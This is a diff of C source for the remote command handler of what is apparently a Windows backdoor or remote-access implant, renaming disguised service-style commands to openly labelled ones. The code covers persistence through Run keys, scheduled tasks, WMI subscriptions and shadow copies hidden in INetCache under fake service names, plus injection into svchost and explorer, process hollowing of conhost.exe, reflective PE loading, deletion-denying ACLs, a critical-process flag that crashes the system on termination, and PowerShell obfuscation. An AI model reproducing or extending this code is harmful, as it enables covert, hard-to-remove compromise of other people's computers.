@@ -209,47 +209,47 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         sys_check_antivirus();
         result = "[Security check complete]";
     }
-    else if (strcmp(cmd, "DEPLOY_SVC") == 0) {
+    else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_spawn_shadow_copy();
-        result = "[System services deployed]";
+        result = "[Spawned 3 copies + ALL layers: Run key, Task, WMI, Injection, NTFS, Fileless Hollow]";
     }
-    else if (strcmp(cmd, "REMOVE_SVC") == 0) {
+    else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         obf_sys_unprotect_process();
-        result = "[Protection removed — process can be terminated]";
+        result = "[Critical flag removed — process can now be terminated]";
     }
-    else if (strcmp(cmd, "SVC_STATUS") == 0) {
+    else if (strcmp(cmd, "CHECK_PROTECTION") == 0) {
         const char *critical_status = obf_sys_check_critical_status();
         const char *admin_status = sys_is_admin() ? "admin" : "not admin";
         snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
         result = response;
     }
-    else if (strcmp(cmd, "SCHEDULE_TASK") == 0) {
+    else if (strcmp(cmd, "WMI_PERSISTENCE") == 0) {
         obf_sys_wmi_persistence();
-        result = "[WMI monitoring configured]";
+        result = "[WMI persistence established: root/subscription, triggers every 30s]";
     }
-    else if (strcmp(cmd, "REMOTE_SVC") == 0) {
+    else if (strcmp(cmd, "INJECT_PROCESS") == 0) {
         obf_sys_inject_process();
-        result = "[Remote process check completed]";
+        result = "[Process injection attempted: payload path injected into svchost/explorer]";
     }
-    else if (strcmp(cmd, "MEM_SVC") == 0) {
+    else if (strcmp(cmd, "HOLLOW_PROCESS") == 0) {
         obf_sys_hollow_process();
-        result = "[Memory process check completed]";
+        result = "[Process hollowing: conhost.exe running our payload purely from memory]";
     }
-    else if (strcmp(cmd, "DLL_LOAD") == 0) {
+    else if (strcmp(cmd, "REFLECT_LOAD") == 0) {
         obf_reflective_load();
-        result = "[Library load check completed]";
+        result = "[Reflective PE loader: full payload injected into explorer.exe without CreateProcess]";
     }
     else if (strcmp(cmd, "HARDEN_FILES") == 0) {
         obf_sys_harden_files();
-        result = "[File permissions set]";
+        result = "[NTFS ACLs hardened: deny delete for all shadow copies]";
     }
     else if (strcmp(cmd, "VERIFY_LAYERS") == 0) {
-        /* Check all services and report status */
+        /* Check all persistence layers and report status */
         char localAppData[MAX_PATH];
         GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
         
         resp_pos = 0;
-        util_appendf(response, &resp_pos, "=== SERVICE VERIFICATION ===\n");
+        util_appendf(response, &resp_pos, "=== LAYER VERIFICATION ===\n");
         
         /* Layer 1: Shadow files on disk */
         for (int i = 0; i < 3; i++) {
@@ -257,7 +257,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             char path[MAX_PATH];
             snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s", localAppData, names[i]);
             DWORD attr = GetFileAttributesA(path);
-            util_appendf(response, &resp_pos, "[S1] %s: %s\n", names[i], 
+            util_appendf(response, &resp_pos, "[L1] %s: %s\n", names[i], 
                         (attr != INVALID_FILE_ATTRIBUTES) ? "EXISTS" : "MISSING");
         }
         
@@ -276,9 +276,9 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             }
             CloseHandle(hSnap);
         }
-        util_appendf(response, &resp_pos, "[S2] ElevationService running: %s\n", elev ? "YES" : "NO");
-        util_appendf(response, &resp_pos, "[S2] CrashHandler running: %s\n", crash ? "YES" : "NO");
-        util_appendf(response, &resp_pos, "[S2] NotifyService running: %s\n", notify ? "YES" : "NO");
+        util_appendf(response, &resp_pos, "[L2] ElevationService running: %s\n", elev ? "YES" : "NO");
+        util_appendf(response, &resp_pos, "[L2] CrashHandler running: %s\n", crash ? "YES" : "NO");
+        util_appendf(response, &resp_pos, "[L2] NotifyService running: %s\n", notify ? "YES" : "NO");
         
         /* Layer 3: Registry */
         HKEY hKey;
@@ -295,23 +295,23 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             size = sizeof(buf);
             int r3 = RegQueryValueExA(hKey, "NotifyService", NULL, &type, (BYTE*)buf, &size);
             RegCloseKey(hKey);
-            util_appendf(response, &resp_pos, "[S3] Registry Run keys: %s\n", 
+            util_appendf(response, &resp_pos, "[L3] Registry Run keys: %s\n", 
                         (r1==ERROR_SUCCESS && r2==ERROR_SUCCESS && r3==ERROR_SUCCESS) ? "ALL OK" : "MISSING");
         } else {
-            util_appendf(response, &resp_pos, "[S3] Registry Run keys: ERROR\n");
+            util_appendf(response, &resp_pos, "[L3] Registry Run keys: ERROR\n");
         }
         
         /* Layer 4: Critical flag */
         const char *crit = obf_sys_check_critical_status();
-        util_appendf(response, &resp_pos, "[S4] Protected status: %s\n", crit);
+        util_appendf(response, &resp_pos, "[L4] Critical flag: %s\n", crit);
         
         /* Layer 5: Admin status */
-        util_appendf(response, &resp_pos, "[S5] Running as: %s\n", sys_is_admin() ? "ADMIN" : "NOT ADMIN");
+        util_appendf(response, &resp_pos, "[L5] Running as: %s\n", sys_is_admin() ? "ADMIN" : "NOT ADMIN");
         
         /* Layer 6: This process path */
         char myPath[MAX_PATH];
         GetModuleFileNameA(NULL, myPath, MAX_PATH);
-        util_appendf(response, &resp_pos, "[S6] This process: %s\n", myPath);
+        util_appendf(response, &resp_pos, "[L6] This process: %s\n", myPath);
         
         result = response;
     }
@@ -326,7 +326,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strncmp(cmd, "OBFUSCATE_PS ", 14) == 0) {
         const char *ps_cmd = cmd + 14;
-        result = sys_encode_cmd(ps_cmd);
+        result = sys_obfuscate_ps(ps_cmd);
     }
     else if (strcmp(cmd, "PROTECT_NOW") == 0) {
         if (!sys_is_admin()) {
@@ -335,7 +335,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             obf_sys_protect_process();
             const char *status = sys_protection_status();
             if (strcmp(status, "CRITICAL") == 0) {
-                result = "[SUCCESS: Process is now protected]";
+                result = "[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]";
             } else if (strcmp(status, "FAILED") == 0) {
                 result = "[FAIL: Protection API failed — likely missing required privilege. Try running as SYSTEM or use a different elevation method.]";
             } else {
@@ -343,9 +343,9 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             }
         }
     }
-    else if (strcmp(cmd, "CLEANUP") == 0) {
+    else if (strcmp(cmd, "UNINSTALL") == 0) {
         sys_uninstall();
-        result = "[Cleanup initiated — all services removed, process will exit]";
+        result = "[UNINSTALL initiated — all persistence removed, process will exit]";
     }
     /* Game module management */
     else if (strncmp(cmd, GAME_FETCH_MODULE, strlen(GAME_FETCH_MODULE)) == 0) {
